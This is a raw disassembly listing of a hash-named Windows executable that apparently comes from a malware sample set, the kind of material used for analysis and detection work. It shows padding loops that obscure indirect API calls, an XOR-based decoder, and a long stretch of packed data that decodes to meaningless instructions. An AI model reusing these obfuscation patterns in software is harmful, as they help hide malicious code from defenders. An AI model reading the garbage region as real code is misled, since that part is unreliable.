
4d5f23c36cd738580b27fc72f3a7a3dcfa32acfc712e3dc2ab4456c641bb471e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421942
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421a4e
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x4234ce
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x423595
  4012ea:	push   0x423619
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	call   0x40914a
  401431:	test   eax,eax
  401433:	je     0x401464
  401439:	lea    eax,[ebp-0x90]
  40143f:	push   eax
  401440:	mov    eax,DWORD PTR [ebp-0x30]
  401443:	xor    eax,esi
  401445:	add    eax,edi
  401447:	push   eax
  401448:	mov    eax,DWORD PTR [ebp-0x2c]
  40144b:	add    eax,0xaa
  401450:	push   eax
  401451:	mov    eax,DWORD PTR [ebp-0x2c]
  401454:	mov    eax,DWORD PTR [eax+0x198]
  40145a:	push   DWORD PTR [eax]
  40145c:	call   0x405c6f
  401461:	mov    DWORD PTR [ebp-0x40],eax
  401464:	lea    eax,[ebp+0x4]
  401467:	mov    DWORD PTR [ebp-0x34],eax
  40146a:	mov    eax,DWORD PTR [ebp-0x8]
  40146d:	mov    eax,DWORD PTR [eax]
  40146f:	mov    eax,DWORD PTR [eax]
  401471:	mov    eax,DWORD PTR [eax]
  401473:	test   eax,eax
  401475:	je     0x4038ab
  40147b:	lea    eax,[ebp-0xc]
  40147e:	mov    DWORD PTR [ebp-0x4c],eax
  401481:	mov    eax,DWORD PTR [ebp-0x3c]
  401484:	mov    DWORD PTR [ebp-0xc],eax
  401487:	mov    eax,DWORD PTR [ebp-0x8]
  40148a:	mov    eax,DWORD PTR [eax]
  40148c:	mov    eax,DWORD PTR [eax]
  40148e:	mov    eax,DWORD PTR [eax]
  401490:	sub    DWORD PTR [ebp-0xc],eax
  401493:	mov    ecx,DWORD PTR [ebp-0x10]
  401496:	xor    ecx,esi
  401498:	mov    eax,0xffcd8d25
  40149d:	sub    eax,ecx
  40149f:	jmp    0x403854
  4014a4:	out    dx,al
  4014a5:	add    eax,0x6723a723
  4014aa:	outs   dx,BYTE PTR ds:[esi]
  4014ab:	sbb    DWORD PTR [edx+0x1b],0xf
  4014af:	hlt    
  4014b0:	test   al,0xe7
  4014b2:	imul   eax,DWORD PTR [esi],0x62626262
  4014b8:	retf   0x625f
  4014bb:	bound  ecx,QWORD PTR [ecx]
  4014bd:	sub    eax,DWORD PTR [edi]
  4014bf:	pop    edx
  4014c0:	add    eax,0x792c0356
  4014c5:	jne    0x40153c
  4014c7:	inc    edi
  4014c8:	rol    DWORD PTR [edx+esi*2],1
  4014cb:	inc    esp
  4014cc:	jno    0x4014f3
  4014ce:	iret   
  4014cf:	retf   
  4014d0:	hlt    
  4014d1:	inc    ebp
  4014d2:	aam    0x97
  4014d4:	cdq    
  4014d5:	add    ebp,DWORD PTR [edx]
  4014d7:	pop    esp
  4014d8:	jno    0x401544
  4014da:	mov    es,WORD PTR [edx-0x43be3b9c]
  4014e0:	daa    
  4014e1:	mov    ecx,0x54f9627
  4014e6:	shr    BYTE PTR [ebp+eax*1+0x2],1
  4014ea:	adc    cl,al
  4014ec:	(bad)  
  4014ed:	(bad)  [esi-0x78]
  4014f0:	and    BYTE PTR [esi+0x31c900b0],dl
  4014f6:	dec    esi
  4014f7:	fbstp  TBYTE PTR [edx-0x62cc368d]
  4014fd:	mov    cs,WORD PTR [eax+0x78]
  401500:	jo     0x4014b8
  401502:	dec    edi
  401503:	pushf  
  401504:	pop    eax
  401505:	jae    0x401491
  401507:	sti    
  401508:	push   es
  401509:	push   0xc72c3d54
  40150e:	pop    esi
  40150f:	cmp    BYTE PTR [edx+0x6c],dl
  401512:	add    ecx,DWORD PTR [edi]
  401514:	push   ss
  401515:	jge    0x40153e
  401517:	mov    ebx,0xa6ab63c3
  40151c:	mov    esp,0xc531c291
  401521:	stc    
  401522:	inc    ebx
  401523:	popf   
  401524:	xchg   edx,eax
  401525:	in     eax,0x12
  401527:	fstp   QWORD PTR [edx]
  401529:	jg     0x4014c9
  40152b:	cmp    ecx,edi
  40152d:	mov    al,ds:0xdb808269
  401532:	dec    ecx
  401533:	loop   0x4014ee
  401535:	inc    eax
  401536:	or     BYTE PTR [ebx],0x2c
  401539:	inc    ebx
  40153a:	pop    ecx
  40153b:	mov    ecx,0xda183803
  401540:	xor    ebx,DWORD PTR [esi+0x22]
  401543:	sbb    ch,BYTE PTR [ebx+ecx*1]
  401546:	inc    esi
  401547:	add    esp,DWORD PTR [eax-0x32d94fe1]
  40154d:	dec    ebp
  40154e:	nop
  40154f:	xchg   edi,eax
  401550:	dec    esi
  401551:	mov    cl,0x25
  401553:	pop    ecx
  401554:	les    ebp,FWORD PTR [eax]
  401556:	sub    eax,ecx
  401558:	vpsubusw xmm0,xmm7,XMMWORD PTR [edi-0x25]
  40155d:	mov    edi,0xdb06d0ab
  401562:	test   al,0x7e
  401564:	bound  edx,QWORD PTR [ebp+0x268b1b46]
  40156a:	in     eax,0xc2
  40156c:	push   ds
  40156d:	sub    DWORD PTR [ebp+0x6c],0x51
  401571:	imul   ebp,edx,0x7fad0cb4
  401577:	add    BYTE PTR [esi+edi*8-0x4b1d4dda],al
  40157e:	cdq    
  40157f:	jo     0x401558
  401581:	or     al,0xf4
  401583:	push   eax
  401584:	mov    ah,0x44
  401586:	sub    DWORD PTR ds:0x31a0782b,0x5433ba1
  401590:	popa   
  401591:	pusha  
  401592:	xchg   DWORD PTR [ebx+edi*1+0x6f],eax
  401596:	xchg   BYTE PTR [ebp-0x22],dh
  401599:	test   al,0x1d
  40159b:	and    dh,BYTE PTR fs:[esi-0x83c7817]
  4015a2:	lods   eax,DWORD PTR ds:[esi]
  4015a3:	ret    
  4015a4:	mov    al,0x6a
  4015a6:	out    dx,eax
  4015a7:	daa    
  4015a8:	clc    
  4015a9:	mov    bl,0x43
  4015ab:	mov    ds:0x2d20df4b,al
  4015b0:	in     eax,0xd2
  4015b2:	xchg   ebp,eax
  4015b3:	pushf  
  4015b4:	popf   
  4015b5:	loop   0x40153c
  4015b7:	pop    esp
  4015b8:	shr    DWORD PTR [ecx],0x17
  4015bb:	xor    dl,BYTE PTR [edi+0x1e5de979]
  4015c1:	push   ebp
  4015c2:	fsub   DWORD PTR [eax-0x2a]
  4015c5:	nop
  4015c6:	lea    esi,[ebp+0x7a53605d]
  4015cc:	sub    bl,bl
  4015ce:	xor    dl,BYTE PTR [ecx+0x5f]
  4015d1:	xor    bl,BYTE PTR [ebp+0x27]
  4015d4:	mov    DWORD PTR [edi],ecx
  4015d6:	add    ebx,ecx
  4015d8:	frstor [edx]
  4015da:	cli    
  4015db:	(bad)
  4015de:	add    DWORD PTR [edi-0x2a5d440c],eax
  4015e4:	jbe    0x4015f6
  4015e6:	jne    0x4015bf
  4015e8:	js     0x40157b
  4015ea:	push   edx
  4015eb:	ins    BYTE PTR es:[edi],dx
  4015ec:	mov    ds,WORD PTR [esi]
  4015ee:	push   ebp
  4015ef:	push   ecx
  4015f0:	add    eax,0x8b99f67c
  4015f5:	out    dx,eax
  4015f6:	inc    esi
  4015f7:	pop    esi
  4015f8:	mov    al,ds:0x733a5fc6
  4015fd:	les    edx,FWORD PTR [edx+0x24]
  401600:	cmp    bl,BYTE PTR [esp+ebx*1-0x1859d618]
  401607:	sbb    BYTE PTR [ecx],bl
  401609:	inc    esp
  40160a:	and    al,0x89
  40160c:	ins    DWORD PTR es:[edi],dx
  40160d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40160e:	daa    
  40160f:	cwde   
  401610:	fistp  WORD PTR [esi+0x681d78dd]
  401616:	inc    esi
  401617:	pop    edx
  401618:	sub    DWORD PTR [esi-0x1b],ecx
  40161b:	adc    edx,DWORD PTR [esi]
  40161d:	je     0x401677
  40161f:	neg    BYTE PTR [ebx]
  401621:	xor    dh,BYTE PTR [esi-0x44]
  401624:	mov    ebx,0x767a2d67
  401629:	add    DWORD PTR [edi-0xcd344dc],edx
  40162f:	push   ebp
  401630:	mov    al,0x68
  401632:	jl     0x40161c
  401634:	inc    esp
  401635:	xor    bh,BYTE PTR ds:0x295a09e7
  40163b:	inc    edx
  40163c:	loope  0x40161b
  40163e:	ja     0x401653
  401640:	adc    BYTE PTR fs:[ecx],cl
  401643:	test   BYTE PTR [edi],dl
  401645:	enter  0xd905,0xfb
  401649:	and    eax,0xd9017992
  40164e:	(bad)  
  40164f:	sub    edi,DWORD PTR [esi+0x13]
  401652:	fimul  DWORD PTR [esi-0x1b]
  401655:	ins    BYTE PTR es:[edi],dx
  401656:	ret    
  401657:	shr    BYTE PTR [eax-0x2d],0x6
  40165b:	aas    
  40165c:	aas    
  40165d:	(bad)  
  40165e:	sbb    ah,BYTE PTR [edx]
  401660:	cwde   
  401661:	loope  0x4016a6
  401663:	inc    eax
  401664:	xchg   DWORD PTR [eax-0x4a826479],ecx
  40166a:	xchg   ebx,eax
  40166b:	sbb    bl,al
  40166d:	test   DWORD PTR ds:0xc7b295d,esp
  401673:	ret    0x48c1
  401676:	mov    ecx,0xd6981938
  40167b:	xor    BYTE PTR [ebp-0x4a],bh
  40167e:	push   ds
  40167f:	aaa    
  401680:	jecxz  0x4016d6
  401682:	shl    DWORD PTR [eax],0x9
  401685:	retf   
  401686:	je     0x401638
  401688:	push   ss
  401689:	sbb    eax,0x977fefec
  40168e:	pop    ebp
  40168f:	test   al,0xe3
  401691:	imul   edi,DWORD PTR [ecx-0x15],0x43
  401695:	mov    ebp,0x4c82f34d
  40169a:	jp     0x401717
  40169c:	imul   esp,ecx,0x10
  40169f:	jp     0x4016f6
  4016a1:	popa   
  4016a2:	or     al,0xc3
  4016a4:	inc    eax
  4016a5:	mov    ds:0xafe8a43f,eax
  4016aa:	out    dx,al
  4016ab:	pushf  
  4016ac:	data16 jmp 0x401671
  4016af:	xchg   eax,ebx
  4016b1:	loope  0x401643
  4016b3:	push   0x48d46735
  4016b8:	jp     0x401675
  4016ba:	jp     0x401695
  4016bc:	jge    0x401663
  4016be:	pop    ds
  4016bf:	xor    DWORD PTR [esi],esi
  4016c1:	dec    eax
  4016c2:	sbb    DWORD PTR [ebp+0x4e],esi
  4016c5:	sub    DWORD PTR [edx*8-0x413545cb],edi
  4016cc:	popf   
  4016cd:	inc    eax
  4016ce:	fcom   QWORD PTR [ebx-0x1b017da1]
  4016d4:	mov    cl,0x21
  4016d6:	mov    ebx,0x1647e58f
  4016db:	adc    eax,DWORD PTR [ebx-0xe]
  4016de:	mov    al,ds:0xe255612
  4016e3:	mov    cl,BYTE PTR [ebx+ebp*8]
  4016e6:	mov    ds:0x28e9f9fe,al
  4016eb:	shl    BYTE PTR [edi-0x66],cl
  4016ee:	add    ah,BYTE PTR [edx]
  4016f0:	or     BYTE PTR [edx-0x7d51ac5d],bl
  4016f6:	dec    ecx
  4016f7:	das    
  4016f8:	push   ds
  4016f9:	mov    ds:0xe0ce44a1,al
  4016fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016ff:	xor    dh,BYTE PTR [ebx-0x541e7a9d]
  401705:	leave  
  401706:	test   BYTE PTR [edi-0x20],bl
  401709:	stos   BYTE PTR es:[edi],al
  40170a:	pop    edx
  40170b:	push   ebp
  40170c:	push   eax
  40170d:	stos   BYTE PTR es:[edi],al
  40170e:	inc    ebx
  40170f:	mov    al,0x69
  401711:	mov    esp,0xd877cea4
  401716:	(bad)  
  401717:	enter  0x318b,0x22
  40171b:	loope  0x401782
  40171d:	mov    dh,0x48
  40171f:	sbb    BYTE PTR [eax],bl
  401721:	fsub   DWORD PTR [ecx]
  401723:	jae    0x40170a
  401725:	sub    bl,BYTE PTR [edi+0xa7c7542]
  40172b:	xchg   esi,eax
  40172c:	not    DWORD PTR [eax]
  40172e:	fs ins BYTE PTR es:[edi],dx
  401730:	inc    eax
  401731:	add    esi,edx
  401733:	jl     0x40170d
  401735:	xchg   edi,eax
  401736:	call   0x2d65:0xaa5fc65d
  40173d:	rcl    DWORD PTR [edi],cl
  40173f:	outs   dx,DWORD PTR ds:[esi]
  401740:	or     ebx,edi
  401742:	out    dx,al
  401743:	leave  
  401744:	xor    al,BYTE PTR [ebp+0x3a40f864]
  40174a:	mov    DWORD PTR [eax+0x3b],0xb105dce9
  401751:	sub    al,0xca
  401753:	sub    eax,0xb665fea5
  401758:	and    dl,0x2b
  40175b:	sub    eax,0x3890b20b
  401760:	mov    ebx,cs
  401762:	ret    
  401763:	in     eax,dx
  401764:	repz mov edi,0x3f12c239
  40176a:	jge    0x40177c
  40176c:	fld    QWORD PTR [edx]
  40176e:	je     0x401753
  401770:	jo     0x401718
  401772:	repnz sti 
  401774:	movd   DWORD PTR [ebp+0x5c],mm6
  401778:	jns    0x401782
  40177a:	int3   
  40177b:	fcomi  st,st(1)
  40177d:	popa   
  40177e:	in     al,dx
  40177f:	cli    
  401780:	enter  0x8983,0xc5
  401784:	into   
  401785:	shl    DWORD PTR [ebx-0x73d4253c],cl
  40178b:	jne    0x4017b8
  40178d:	push   esi
  40178e:	fistp  QWORD PTR [eax+0x1e]
  401791:	aad    0x65
  401793:	or     BYTE PTR [ebx-0x7a],bh
  401796:	push   es
  401797:	sub    eax,0xc5a3e5c4
  40179c:	mov    ds:0x4fe87104,al
  4017a1:	out    0xfd,al
  4017a3:	popf   
  4017a4:	add    eax,0xffffffa1
  4017a7:	in     eax,0xd2
  4017a9:	mov    al,ds:0x3561d0ab
  4017ae:	add    BYTE PTR [ecx+eiz*1+0x33],dh
  4017b2:	mov    dl,BYTE PTR [ebx-0x14]
  4017b5:	adc    eax,0xd5ad5fd4
  4017ba:	test   eax,0x36f38900
  4017bf:	fwait
  4017c0:	mov    dh,0x33
  4017c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017c3:	arpl   WORD PTR [eax],ax
  4017c5:	xchg   ecx,eax
  4017c6:	mov    eax,ds:0x798448b5
  4017cb:	push   ebp
  4017cc:	jns    0x401798
  4017ce:	mov    esi,0xa3b879a5
  4017d3:	add    eax,0x63d95e6c
  4017d8:	and    DWORD PTR [ebx+0x71],ebp
  4017db:	pop    eax
  4017dc:	and    BYTE PTR ds:0xf9003d7c,ch
  4017e2:	ins    DWORD PTR es:[edi],dx
  4017e3:	(bad)  
  4017e4:	jle    0x4017dc
  4017e6:	xchg   ecx,eax
  4017e7:	int3   
  4017e8:	test   eax,edx
  4017ea:	pop    ss
  4017eb:	dec    edx
  4017ec:	jmp    0x401867
  4017ee:	inc    edi
  4017ef:	push   esp
  4017f0:	xchg   edx,eax
  4017f1:	push   ds
  4017f2:	mov    edx,0x87157f46
  4017f7:	loop   0x401782
  4017f9:	sbb    bh,BYTE PTR [edi+0x59]
  4017fc:	lock pop ss
  4017fe:	imul   edx,DWORD PTR [esi+0x3ac09c65],0xffffffcd
  401805:	xchg   edi,eax
  401806:	pop    edx
  401807:	push   esp
  401808:	rep ins BYTE PTR es:[edi],dx
  40180a:	sbb    bl,BYTE PTR [edi-0x28]
  40180d:	stc    
  40180e:	mov    ebx,0x7b8a14f6
  401813:	add    DWORD PTR [ebx-0x18],edi
  401816:	dec    ecx
  401817:	xchg   esi,eax
  401818:	lock iret 
  40181a:	push   edx
  40181b:	fld    TBYTE PTR [edx]
  40181d:	sub    edi,DWORD PTR [esi]
  40181f:	push   ebx
  401820:	push   esi
  401821:	pop    eax
  401822:	jbe    0x401841
  401824:	cmp    al,0xa1
  401826:	js     0x4017c9
  401828:	jle    0x4017d8
  40182a:	dec    eax
  40182b:	jb     0x401860
  40182d:	hlt    
  40182e:	shl    DWORD PTR ds:0x4f787ac4,0xd5
  401835:	(bad)  
  401836:	repnz fbld TBYTE PTR [ebp+0x83ebfd6]
  40183d:	retf   0xa38d
  401840:	mov    eax,ds:0xe90bb400
  401845:	in     al,0x5f
  401847:	inc    edx
  401848:	jno    0x401813
  40184a:	mov    esp,ebp
  40184c:	push   ecx
  40184d:	adc    DWORD PTR [edi-0x5a],esp
  401850:	add    ebx,esi
  401852:	fbstp  TBYTE PTR [ebp+0x2da82109]
  401858:	aas    
  401859:	lock pop ebp
  40185b:	or     DWORD PTR [edi+0x4d],esp
  40185e:	push   ds
  40185f:	cmp    ch,BYTE PTR [eax+eiz*2+0x13]
  401863:	xor    esi,DWORD PTR [edx+0x77]
  401866:	adc    ch,BYTE PTR [ebp+0x5e]
  401869:	dec    edx
  40186a:	(bad)  
  40186b:	hlt    
  40186c:	adc    edx,DWORD PTR ds:0x137efcb4
  401872:	xchg   ebp,eax
  401873:	ss call 0x6055:0xf904af0a
  40187b:	jne    0x4017fe
  40187d:	enter  0xb309,0xbb
  401881:	pop    ecx
  401882:	cmp    BYTE PTR [esi-0x761e59ab],bh
  401888:	push   esp
  401889:	fnstsw WORD PTR [edx-0x29da8f16]
  40188f:	dec    ebx
  401890:	in     eax,dx
  401891:	jmp    0x4018a3
  401893:	lds    esp,FWORD PTR [edi+edi*8+0x73]
  401897:	in     eax,dx
  401898:	mov    edx,0xe4f46078
  40189d:	mov    ah,0x9e
  40189f:	cwde   
  4018a0:	push   DWORD PTR [edx+0x2c]
  4018a3:	popa   
  4018a4:	retf   
  4018a5:	int    0x38
  4018a7:	push   es
  4018a8:	fiadd  DWORD PTR [edi]
  4018aa:	sti    
  4018ab:	aaa    
  4018ac:	lea    edi,[esi+0x1272b1f8]
  4018b2:	jmp    0x9e4293a4
  4018b7:	repnz lock and bh,BYTE PTR [eax-0x79b80f32]
  4018bf:	mov    DWORD PTR [edx],0xcae0eacb
  4018c5:	in     eax,0x1e
  4018c7:	fild   QWORD PTR [esi]
  4018c9:	sbb    cl,BYTE PTR [edx+0x2fd15b13]
  4018cf:	fist   WORD PTR [ebx-0x2a]
  4018d2:	in     eax,dx
  4018d3:	mov    bh,0xc8
  4018d5:	push   ebx
  4018d6:	xchg   edx,eax
  4018d7:	push   ebp
  4018d8:	jle    0x4018a1
  4018da:	daa    
  4018db:	retf   
  4018dc:	hlt    
  4018dd:	dec    ecx
  4018de:	call   0x52a6:0x2f840a30
  4018e5:	pop    ecx
  4018e6:	scas   eax,DWORD PTR es:[edi]
  4018e7:	jne    0x4018f8
  4018e9:	js     0x4018a9
  4018eb:	jmp    0xa23157fc
  4018f0:	push   esp
  4018f1:	(bad)  
  4018f3:	push   esp
  4018f4:	gs imul ah
  4018f7:	adc    DWORD PTR [edi],ebx
  4018f9:	in     eax,dx
  4018fa:	daa    
  4018fb:	cli    
  4018fc:	shl    bl,0xc2
  4018ff:	sar    DWORD PTR [eax+0x19f209da],cl
  401905:	(bad)  
  401906:	jle    0x401943
  401908:	dec    esp
  401909:	push   edi
  40190a:	mov    bl,0x58
  40190c:	aad    0x7f
  40190e:	add    eax,0x2d4c992b
  401913:	call   0x70f:0xf62c4ffa
  40191a:	ret    
  40191b:	stos   BYTE PTR es:[edi],al
  40191c:	lea    eax,[esi-0x1e0d11a4]
  401922:	xchg   ebx,eax
  401923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401924:	shl    BYTE PTR [ecx-0x14814359],0x12
  40192b:	jb     0x4018b8
  40192d:	xchg   ebp,eax
  40192e:	loopne 0x401947
  401930:	jns    0x4018b6
  401932:	scas   eax,DWORD PTR es:[edi]
  401933:	pop    edx
  401934:	adc    eax,ebx
  401936:	sbb    esi,DWORD PTR [edx+eiz*1]
  401939:	or     edi,DWORD PTR [eax+0x74]
  40193c:	dec    ecx
  40193d:	jl     0x4019ad
  40193f:	dec    edi
  401940:	jp     0x401924
  401942:	int    0x92
  401944:	mov    esp,0x35ea540f
  401949:	out    0x6d,al
